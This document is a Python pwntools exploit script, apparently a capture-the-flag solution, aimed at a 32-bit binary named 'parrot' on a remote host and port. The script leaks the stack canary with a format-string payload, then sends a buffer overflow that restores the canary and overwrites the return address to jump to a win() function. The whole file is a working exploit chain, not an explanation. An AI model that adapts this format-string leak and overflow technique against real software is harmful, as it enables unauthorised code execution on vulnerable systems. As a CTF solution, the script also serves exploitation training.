
#!/usr/bin/env python3
from pwn import *
import argparse
import re

parser = argparse.ArgumentParser()
parser.add_argument("--host", default="10.234.128.27")
parser.add_argument("--port", type=int, default=24002)
parser.add_argument("--index", type=int, default=38)
parser.add_argument("--debug", action="store_true")
args = parser.parse_args()

context.clear(arch="i386", os="linux")
context.log_level = "debug" if args.debug else "info"

elf = ELF("./parrot", checksec=False)

WIN = elf.sym["win"]
CANARY_OFFSET = 128
RET_OFFSET = 144

def main():
    log.info(f"Target: {args.host}:{args.port}")
    log.info(f"win(): {hex(WIN)}")

    io = remote(args.host, args.port)

    # Stage 1: Leak stack canary
    io.sendlineafter(
        b"You: ",
        f"LEAK:%{args.index}$08x:END".encode()
    )

    response = io.recvuntil(b":END", timeout=5)
    match = re.search(rb"LEAK:([0-9a-fA-F]{8}):END", response)

    if not match:
        log.failure("Canary leak failed")
        log.info(repr(response))
        io.close()
        return

    canary = int(match.group(1), 16)
    log.success(f"Canary: {canary:#010x}")

    if canary & 0xff:
        log.warning("Canary low byte is nonzero; check --index")

    # Stage 2: Stack buffer overflow
    payload = flat(
        b"A" * CANARY_OFFSET,
        p32(canary),
        b"B" * (RET_OFFSET - CANARY_OFFSET - 4),
        p32(WIN),
    )

    log.info(f"Payload size: {len(payload)} bytes")
    log.info(f"Return address: {hex(WIN)}")

    io.sendafter(
        b"You: ",
        payload
    )

    # Stage 3: Receive win() output
    result = io.recvall(timeout=5)

    print("\n========== RESULT ==========")
    print(result.decode(errors="replace"))
    print("============================")

    if b"The cage is open!" in result:
        log.success("win() executed!")
    else:
        log.failure("win() not confirmed")

    io.close()

if __name__ == "__main__":
    main()

